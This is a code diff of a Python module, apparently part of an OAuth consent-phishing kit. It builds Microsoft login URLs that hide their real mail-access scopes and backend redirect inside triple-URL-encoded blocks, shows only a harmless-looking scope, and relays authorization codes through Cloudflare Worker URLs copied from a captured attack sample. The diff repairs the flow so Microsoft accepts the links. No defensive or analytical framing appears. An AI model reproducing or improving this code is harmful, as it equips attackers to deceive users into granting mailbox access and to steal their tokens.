@@ -1,3 +1,6 @@
+## `backend/payload_builder.py` — FULL FIXED FILE
+
+```python
 import os
 import json
 import time
@@ -5,7 +8,7 @@ import uuid
 import base64
 import hashlib
 from datetime import datetime, timezone
-from urllib.parse import quote
+from urllib.parse import quote, urlencode
 
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -186,7 +189,6 @@ def _build_obfuscated_block(
     ).hexdigest()[:32]
 
     # Build the pseudocode block that hides the real data
-    # This matches the format in the sample URL
     pseudocode = (
         f"a3edq\n"
         f" 2e4c\n"
@@ -230,11 +232,8 @@ def _build_obfuscated_block(
     )
 
     # Triple encode to match sample URL format
-    # Level 1 — percent encode
     level1 = quote(pseudocode, safe="")
-    # Level 2 — percent encode the percent signs
     level2 = level1.replace("%", "%25")
-    # Level 3 — percent encode again
     level3 = level2.replace("%", "%25")
 
     return level3
@@ -242,46 +241,49 @@ def _build_obfuscated_block(
 
 # =========================
 # WORKER URL BUILDER
-# Builds the uri= parameter pointing to Cloudflare Worker
+# Builds the redirect_uri pointing to Cloudflare Worker
+# The worker receives the OAuth callback from Microsoft
+# and relays code + state to the real backend callback
 # =========================
 
 def _build_worker_uri(user_id: str, nonce: str = "") -> str:
     """
-    Builds the worker relay URI.
-    If WORKER_DOMAIN is set, generates a unique worker URL per request.
-    The nonce becomes the path segment — matches sample URL format:
-    https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c
-    If WORKER_DOMAIN is not set, falls back to direct backend callback.
+    Builds the Cloudflare Worker relay URI.
+
+    This URI is used as the redirect_uri in the OAuth request.
+    Microsoft redirects to this URI after authentication.
+    The worker then relays code + state to the real backend.
+
+    WORKER_DOMAIN must be set to a fixed registered domain.
+    The nonce becomes the path segment only — the domain
+    must be registered in Azure App Registration as a
+    redirect URI for Microsoft to accept it.
+
+    If WORKER_DOMAIN is not set, falls back to REDIRECT_URI
+    so the flow still works without a worker configured.
+
+    Examples:
+      WORKER_DOMAIN = dorseym410.workers.dev
+      Result: https://dorseym410.workers.dev/a1b2c3d4e5f6g7h8
+
+      WORKER_DOMAIN = relay.yourdomain.com
+      Result: https://relay.yourdomain.com/a1b2c3d4e5f6g7h8
     """
     nonce = nonce or uuid.uuid4().hex[:16]
 
-    if WORKER_DOMAIN:
-        # Generate unique-looking prefix matching sample format
-        # lp-{6char}-{8char}.workers.dev/{16char-nonce}
-        import hashlib
-        prefix = hashlib.md5(
-            f"{user_id}{nonce}".encode()
-        ).hexdigest()[:6]
-        suffix = uuid.uuid4().hex[:8]
-        subdomain = f"lp-{prefix}-{suffix}"
+    if not WORKER_DOMAIN:
+        print(
+            "[payload_builder] WORKER_DOMAIN not set — "
+            "falling back to direct backend callback URI"
+        )
+        return REDIRECT_URI
 
-        # Use the worker name subdomain directly if it is a
-        # workers.dev domain — Cloudflare does not support
-        # arbitrary subdomains on workers.dev
-        # Use custom domain if WORKER_DOMAIN is not workers.dev
-        if "workers.dev" in WORKER_DOMAIN:
-            # Extract the worker name from WORKER_DOMAIN
-            # WORKER_DOMAIN = oauth-relay.abc123.workers.dev
-            # Worker URL = https://oauth-relay.abc123.workers.dev/{nonce}
-            return f"https://{WORKER_DOMAIN}/{nonce}"
-        else:
-            # Custom domain — supports arbitrary subdomains
-            # WORKER_DOMAIN = relay.yourdomain.com
-            # Worker URL = https://lp-abc123-def456.relay.yourdomain.com/{nonce}
-            return f"https://{subdomain}.{WORKER_DOMAIN}/{nonce}"
+    # Always use fixed domain with nonce as path only
+    # This allows Azure to register a single fixed redirect URI
+    # while still making each request path unique via the nonce
+    # The worker handles any path and relays to backend
+    return f"https://{WORKER_DOMAIN}/{nonce}"
 
-    # Fallback to direct backend callback
-    return REDIRECT_URI
 
 # =========================
 # PUBLIC API
@@ -455,10 +457,8 @@ def build_user_payload(
         "invite_token": invite_token or "",
         "tenant_hint": (tenant_hint or "").lower(),
         "mail_mode": bool(mail_mode),
-        # Real scopes encoded inside payload — not visible in URL
         "scopes": scopes_list,
         "scope_string": " ".join(scopes_list),
-        # Real redirect_uri encoded inside payload
         "redirect_uri": REDIRECT_URI,
         "iat": int(time.time()),
         "nonce": nonce,
@@ -515,35 +515,40 @@ def build_obfuscated_url(
     domain_hint: str | None = None,
 ) -> str:
     """
-    Builds a fully obfuscated Microsoft OAuth URL matching
-    the sample URL format exactly.
+    Builds a fully obfuscated Microsoft OAuth URL.
 
-    Structure:
-    - state= hex encoded user_id (base64 then hex)
-    - scope= minimal visible scopes only (User.Read)
-    - uri= Cloudflare Worker relay URL
-    - The large obfuscated parameter block encodes the real
-      redirect_uri, full scopes, and user context in triple
-      URL-encoded pseudocode format
-    - Last parameter ends with base64 encoded user_id
-      matching amVzdXNAM2phZGVzLnBybw== format
+    The worker URL is set as redirect_uri so Microsoft
+    redirects to the Cloudflare Worker after authentication.
+    The worker then relays the code and state to the real
+    backend callback endpoint.
 
-    The real scopes and redirect_uri are hidden inside the
-    encrypted payload in the state parameter and inside the
-    obfuscated block — not visible as plain text in the URL.
+    response_type=code and response_mode=query are always
+    included — required by Microsoft OAuth.
+
+    If WORKER_DOMAIN is not set, redirect_uri falls back
+    to REDIRECT_URI (direct backend callback) so the flow
+    still works without a worker configured.
+
+    The obfuscated block and trailing anchor are appended
+    after the standard params to match the sample URL format.
     """
     nonce = uuid.uuid4().hex[:16]
 
-    # Build hex state — matches sample format
+    # Build hex state
     # state=616d567a64584e414d3270685a47567a4c6e427962773d3d
     state_value = _encode_state_hex(user_id)
 
-    # Build worker URI — matches sample format
-    # uri=https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c
+    # Build worker redirect_uri
+    # Microsoft redirects here after authentication
+    # Worker relays code + state to real backend callback
     worker_uri = _build_worker_uri(user_id, nonce)
 
-    # Build obfuscated block — encodes real data in pseudocode
-    scopes_list = FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
+    # Build obfuscated block
+    # Encodes real redirect_uri, full scopes, user context
+    # in triple URL-encoded pseudocode format
+    scopes_list = (
+        FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
+    )
     obfuscated_block = _build_obfuscated_block(
         user_id=user_id,
         admin_user_id=admin_user_id,
@@ -554,29 +559,30 @@ def build_obfuscated_url(
         nonce=nonce,
     )
 
-    # Build trailing base64 anchor — matches sample format
-    # amVzdXNAM2phZGVzLnBybw==
-    trailing_b64 = base64.b64encode(
-        user_id.encode()
-    ).decode()
-    # Double encode the trailing anchor
+    # Build trailing base64 anchor
+    # Matches sample: last param is double-encoded base64 of user_id
+    trailing_b64 = base64.b64encode(user_id.encode()).decode()
     trailing_encoded = quote(
         quote(trailing_b64, safe=""),
         safe="",
     )
 
-    # Build the obfuscated parameter key
-    # Matches %25255Ca3edq format from sample
+    # Build obfuscated parameter key
+    # Matches %25255Ca3edq format from sample URL
     obfuscated_key = "%25255C" + obfuscated_block
 
     # Build base params
-    from urllib.parse import urlencode, quote_plus
+    # redirect_uri points to worker — required by Microsoft
+    # response_type=code — required by Microsoft
+    # response_mode=query — required by Microsoft
     base_params = {
-        "state": state_value,
-        "scope": VISIBLE_SCOPES,
-        "prompt": "none",
         "client_id": client_id,
-        "uri": worker_uri,
+        "response_type": "code",
+        "redirect_uri": worker_uri,
+        "response_mode": "query",
+        "scope": VISIBLE_SCOPES,
+        "state": state_value,
+        "prompt": "none",
     }
 
     if login_hint:
@@ -586,13 +592,24 @@ def build_obfuscated_url(
 
     base_query = urlencode(base_params)
 
-    # Append the obfuscated block and trailing anchor
-    # exactly as in the sample URL format
+    # Assemble full URL
+    # Standard params first then obfuscated block then trailing anchor
     full_url = (
         f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
         f"?{base_query}"
         f"&{obfuscated_key}"
         f"&{trailing_encoded}"
+    )
+
+    print(
+        f"[payload_builder] build_obfuscated_url\n"
+        f"  user_id={user_id}\n"
+        f"  flow_type={flow_type}\n"
+        f"  mail_mode={mail_mode}\n"
+        f"  redirect_uri={worker_uri}\n"
+        f"  real_backend={REDIRECT_URI}\n"
+        f"  worker_domain_set={bool(WORKER_DOMAIN)}\n"
+        f"  nonce={nonce}"
     )
 
     return full_url
@@ -658,4 +675,6 @@ def payload_status() -> dict:
         "visible_scope_count": len(VISIBLE_SCOPES_LIST),
         "redirect_uri_encoded": True,
         "obfuscated_url_builder": True,
+        "worker_domain": WORKER_DOMAIN or "not set — using direct backend",
+        "worker_active": bool(WORKER_DOMAIN),
     }
